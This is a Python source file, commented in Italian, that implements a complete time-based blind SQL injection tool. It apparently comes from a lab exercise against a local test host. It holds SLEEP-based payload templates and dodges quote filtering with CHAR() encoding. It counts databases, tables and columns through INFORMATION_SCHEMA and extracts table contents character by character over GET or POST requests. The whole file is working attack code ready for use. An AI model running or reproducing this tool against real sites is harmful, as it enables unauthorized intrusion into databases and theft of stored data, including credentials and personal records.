import requests
import datetime
import numpy as np
import re

#Usando python bisogna ricordarsi di convertire tutti gli indici usati come interi in str prima di concatenarli

isGet = True
inxTemplate = 2

#payload base
#http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com

# format(sleeptime, column_name, tabledb_name, row, underscores)
templatesLength = [
    "\' AND (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
    "\' OR (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
    "(SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4})"
]

#format(column_name, tabledb_name, row, pos+1, char, sleeptime)
templatesCell = [
    "\' AND IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
    "\' OR IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
    "IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))"
]

#format(tabledb_name, char, sleeptime)
templatesNumRows = [
    "\' AND IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
    "\' OR IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
    "IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0))"
]

#format(sleeptime)
templatesTest = [
    "\' AND SLEEP({0}) -- -",
    "\' OR SLEEP({0}) -- -",
    "SLEEP({0})"
]

def findTemplate(url, sleeptime):
    global inxTemplate
    for i in range (0, len(templatesTest)):
        payload = templatesTest[i].format(sleeptime)
        #payload2 = "shishkebbab"
        if(request(url, payload, sleeptime)):
            inxTemplate = i
            print(inxTemplate)
            return


#Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
def findCellValue(url, tabledb_name, row, column_name, params, sleeptime):
    print("findCellValue length")
    length=0
    undersc = []  #Vettore di caratteri underscore
    concatList = ["CHAR(", "95"]
    for i in range(1, 50):
        undersc.append('_')

        #Essendo che gli ' sono sanitizzati, si aggira il problema convertendo il valore dell'undescore
        #in decimale usando la funzione CHAR e lo concateno alla query
        #______ con CONCAT 
        concatStr="".join(concatList) + ")"
        concatList.append(",95")
        
        #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
        if(isGet):
            #payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
            payload = templatesLength[inxTemplate].format(sleeptime, column_name, tabledb_name, row, concatStr)
        else:
            #Costruzione parametri
            listParams = re.split('&|=', params)
            payload = {}
            for j in range(0, len(listParams)-1, 2):
                if(listParams[j+1] == '{0}'):
                    payload[listParams[j]] = templatesLength[inxTemplate].format(sleeptime, column_name, tabledb_name, row, concatStr)
                else:
                    payload[listParams[j]] = listParams[j+1]

            #print(payload)

        #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
        if(request(url, payload, sleeptime)):
            length=i
            print(length)
            break

    print("findCellValue value")
    string = []
    for pos in range(0, length):    #posizione del carattere
        for i in range(46, 122):    #char in codifica ascii

            #Nuovamente ricontrollo con che metodo invio le query
            if(isGet):
                payload=templatesCell[inxTemplate].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
            else:
                listParams = re.split('&|=', params)
                payload = {}
                for j in range(0, len(listParams)-1, 2):
                    if(listParams[j+1] == '{0}'):
                        payload[listParams[j]] = templatesCell[inxTemplate].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
                    else:
                        payload[listParams[j]] = listParams[j+1]


            #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
            if(request(url, payload, sleeptime)):
                string.append(chr(i))
                print(string)
                break
    
    return ''.join(string) #Compatto tutti i caratteri

#Trova numero delle righe di una tabella
def findNumRows(url, tabledb_name, params, sleeptime):
    print("findNumRows")
    numrows=0
    for i in range(1, 100):
        if(isGet):
            payload = templatesNumRows[inxTemplate].format(tabledb_name, i, sleeptime)
        else:
            #Costruzione dizionario
            #divisione della stringa in forma "arg1=par1%arg2=par2" in lista
            listParams = re.split('&|=', params)
            
            payload = {}
            for j in range(0, len(listParams)-1, 2):
                if(listParams[j+1] == '{0}'):   #Si inserisce query nel payload
                    payload[listParams[j]] = templatesNumRows[inxTemplate].format(tabledb_name, i, sleeptime)
                else:
                    payload[listParams[j]] = listParams[j+1]
            
            #print(payload)

        #Quando la query va a buon fine, salvo il numero di righe trovate e esco dal ciclo
        if(request(url, payload, sleeptime)):
            numrows=i
            break

    print(numrows)
    return numrows

#Effettua la richiesta al sito per la ricerca dei valori/db/tabelle
def request(url, payload, sleeptime):   #sleeptime deriva da calcRitardo
    elapsed = requestTime(url, payload) #elapsed deriva da requestTime
    #print(elapsed) #funz tempo richiesta

    #Ritorna T/F, confronto il tempo di risposta con un'oggetto tempo dai noi creato
    return elapsed > datetime.timedelta(seconds=sleeptime)

#Effettua una richiesta e ritorna il tempo di risposta  
def requestTime(url, payload):
    #costruire il payload
    #inviare richiesta a server
    #ans = requests.get('http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com\' AND SLEEP(1)-- -')

    #Ans è un'oggetto della risposta alla richiesta che, tra gli altri, contiene il tempo di risposta che a noi serve
    if(isGet):
        ans = requests.get(url + payload)
    else:
        #richiesta in post
        ans = requests.post(url, data=payload)
    #print(ans)
    #print(ans.content)
    return ans.elapsed #funz tempo richiesta

    
#stampa i nomi dei db
def findDbNames(url, params, sleeptime):
    numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", params, sleeptime)
    for i in range(0, numDbs):
        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", params, sleeptime))

#stampa i nomi delle tabelle
def findTableNames(url, dbname, params, sleeptime):
    numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), params, sleeptime)
    print(numTbls)
    for i in range(0, numTbls):
        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", params, sleeptime))

#Ritorna i nomi delle colonne
def findColumnNames(url, dbname, tablename, params, sleeptime):
    cols = []
    numCols = findNumRows(url, 
                "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), 
                params, 
                sleeptime)
    for i in range(0, numCols):
        cols.append(findCellValue(url,
                         "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), 
                         i, 
                         "column_name", 
                         params, 
                         sleeptime))    
    return cols

#stampa il contenuto di una tabella
def findTableContent(url, dbname, tablename, columns, params, sleeptime):
    numrows=findNumRows(url, tablename, params, sleeptime)
    for temp in range(0, numrows):
        tempRow=[]
        for column_name in columns:
            tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, params, sleeptime))
        print(tempRow)


def convertToChar(string):
    concatList = ["CHAR("]
    stringV = list(string)

    concatList.append(str(ord(stringV[0])))

    for c in range(1, len(stringV)):
        concatList.append("," + str(ord(stringV[c])))

    return "".join(concatList) + ")"


def calcRitardo(url):
    print("CalcRitardo")
    #dichiarazione array con libreria numpy (gestione avanzata di array e numeri)
    times = np.array([])

    #10 richieste per test
    for i in range(0, 10):
        times = np.append(times, requestTime(url, "").total_seconds())

    #toglie due teste e due code
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmin(times))
    times = np.delete(times, np.argmin(times))

    print(10*np.mean(times))
    return 10*np.mean(times)

########################################

#Codice per la creazione di comandi da shell
#Iniz parser 
import argparse
parser = argparse.ArgumentParser(description="Description of prog")
# -db "url" -------> funzione che stampa i db
parser.add_argument('-db', help='stampa elenco dei db. Uso: python tool.py -db [URL]', dest="db", nargs=1)

# -tbl "url", db  -----> funzione che stampa tutte le tbl del db
parser.add_argument('-tbl', help='stampa tutte le tbl del db. Uso: python tool.py -tbl [URL] [Nome DB]', dest="tbl", nargs=2)

# -all "url", db , tabl -------> funzione che stampa i dati della tabella
parser.add_argument('-all', help='Stampa i dati della tabella. Uso: python tool.py -all [URL] [Nome DB] [Nome Tabella]', dest="all", nargs=3)

# -post --- se si vuole fare le richieste con metodo POST
parser.add_argument('--post', help='Abilita la richiesta in POST, passando dei parametri (nella forma arg1=val1&arg2=val2). Uso: --post [Parametri]', dest='post', nargs=1)

args = parser.parse_args()

params = ""     #Var globale d'appoggio dei parametri POST
if(args.post is not None):
    isGet = False
    params = args.post[0]

if(args.db is not None):
    print(args.db)
    rit = calcRitardo(args.db[0])
    findTemplate(args.db[0], rit)
    findDbNames(args.db[0], params, rit)

if(args.tbl is not None):
    rit = calcRitardo(args.tbl[0])
    findTemplate(args.tbl[0], rit)
    findTableNames(args.tbl[0], args.tbl[1], params, rit)

if(args.all is not None):
    rit = calcRitardo(args.all[0])
    findTemplate(args.all[0], rit)
    colNames = findColumnNames(args.all[0], args.all[1], args.all[2], params, rit)
    print(colNames)
    findTableContent(args.all[0], args.all[1], args.all[2], colNames, params, rit)